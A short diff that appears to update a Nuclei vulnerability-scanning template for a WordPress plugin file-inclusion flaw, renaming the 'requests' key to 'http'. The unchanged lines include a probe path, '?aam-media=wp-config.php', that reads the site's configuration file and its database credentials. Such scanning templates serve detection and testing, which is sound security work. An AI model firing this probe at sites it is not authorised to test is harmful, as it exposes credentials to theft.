@@ -7,7 +7,7 @@ info:
   tags: wordpress,wp-plugin,lfi,wp
   reference: https://wpscan.com/vulnerability/9873
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/?aam-media=wp-config.php '
